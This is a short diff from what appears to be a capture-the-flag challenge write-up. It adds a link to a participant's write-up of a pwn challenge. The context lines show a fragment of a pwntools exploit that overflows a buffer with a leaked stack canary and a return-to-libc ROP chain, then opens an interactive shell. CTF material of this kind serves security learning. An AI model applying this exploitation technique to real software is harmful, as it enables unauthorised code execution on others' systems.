@@ -52,5 +52,6 @@ p.sendline(b"A"*52 + p64(canary) + b"AAAAAAAA"+p64(pop_rdi)+p64(next(libc.search
 p.interactive()
 ```
 
-
+**Participant write-ups:**  
+<a href="https://scavengersecurity.com/dekractf-weird-chall-pwn/">Write-up by Scavenger Security</a>
 
